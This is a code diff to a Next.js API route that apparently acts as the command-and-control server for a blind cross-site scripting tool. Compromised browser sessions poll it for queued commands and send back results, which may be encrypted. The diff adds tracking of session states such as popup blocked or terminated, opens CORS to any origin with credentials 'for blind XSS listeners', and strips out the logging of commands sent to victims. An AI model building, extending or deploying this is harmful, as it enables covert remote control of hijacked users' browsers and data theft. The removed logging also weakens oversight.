@@ -10,18 +10,22 @@ interface PersistSession {
     pending_command: string | null;
     last_response: string | null;
     last_response_at: string | null;
+    session_status: string | null;
 }
 
 interface Setting {
     value: string;
 }
 
+// CORS headers for all responses - MUST allow everything for blind XSS listeners
 const corsHeaders = {
     'Access-Control-Allow-Origin': '*',
     'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH',
     'Access-Control-Allow-Headers': '*',
-    'Access-Control-Allow-Private-Network': 'true',
+    'Access-Control-Allow-Credentials': 'true',
     'Access-Control-Max-Age': '86400',
+    'Access-Control-Allow-Private-Network': 'true',
+    'Access-Control-Expose-Headers': '*',
 };
 
 // Get encryption key from settings
@@ -78,7 +82,7 @@ export async function OPTIONS(request: NextRequest) {
 export async function POST(request: Request) {
     try {
         const body = await request.json();
-        const { rid, response, encrypted, nocrypto } = body;
+        const { rid, response, encrypted, nocrypto, status } = body;
 
         if (!rid) {
             return NextResponse.json(
@@ -99,6 +103,17 @@ export async function POST(request: Request) {
 
         if (existing) {
             cmd = existing.pending_command;
+            
+            // If status update (popup_blocked, popup_opened, terminated, etc.)
+            if (status) {
+                await query(
+                    `UPDATE persistent_sessions 
+                     SET last_seen = NOW(), session_status = $1
+                     WHERE report_id = $2`,
+                    [status, rid]
+                );
+                return NextResponse.json({ ok: true }, { headers: corsHeaders });
+            }
             
             // If response is provided, store it (decrypt if encrypted)
             if (response !== undefined) {
@@ -138,13 +153,11 @@ export async function POST(request: Request) {
         } else {
             const sessionId = generateId();
             await query(
-                `INSERT INTO persistent_sessions (id, report_id, last_seen) 
-                 VALUES ($1, $2, NOW())`,
-                [sessionId, rid]
+                `INSERT INTO persistent_sessions (id, report_id, last_seen, session_status) 
+                 VALUES ($1, $2, NOW(), $3)`,
+                [sessionId, rid, status || 'active']
             );
         }
-
-        console.log(`[Persist] Poll from ${rid}, cmd: ${cmd ? 'yes' : 'none'}, response: ${response ? 'yes' : 'no'}, encrypted: ${encrypted ? 'yes' : 'no'}, nocrypto: ${nocrypto ? 'yes' : 'no'}`);
 
         return NextResponse.json(
             { cmd },
@@ -170,8 +183,6 @@ export async function PUT(request: Request) {
 
         const body = await request.json();
         const { report_id, command } = body;
-
-        console.log(`[Persist] Sending command to ${report_id}: ${command}`);
 
         if (!report_id || !command) {
             return NextResponse.json(
@@ -208,8 +219,6 @@ export async function PUT(request: Request) {
             'UPDATE persistent_sessions SET pending_command = $1 WHERE report_id = $2',
             [command, report_id]
         );
-
-        console.log(`[Persist] Command queued for ${report_id}`);
 
         return NextResponse.json({ success: true });
     } catch (error) {
@@ -254,14 +263,19 @@ export async function GET(request: Request) {
 
         const persistSession = result[0];
         const diffSeconds = Math.round(persistSession.diff_seconds);
+        const isTerminated = persistSession.session_status === 'terminated';
+        const isPopupBlocked = persistSession.session_status === 'popup_blocked';
 
         return NextResponse.json({
-            connected: diffSeconds <= 15, // 15 seconds timeout (poll is every 3s)
+            connected: !isTerminated && diffSeconds <= 15, // 15 seconds timeout (poll is every 3s)
             lastSeen: persistSession.last_seen,
             diffSeconds,
             lastResponse: persistSession.last_response,
             lastResponseAt: persistSession.last_response_at,
             encrypted: !!encryptionKey,
+            sessionStatus: persistSession.session_status,
+            terminated: isTerminated,
+            popupBlocked: isPopupBlocked,
         });
     } catch (error) {
         console.error('[Persist] Status error:', error);
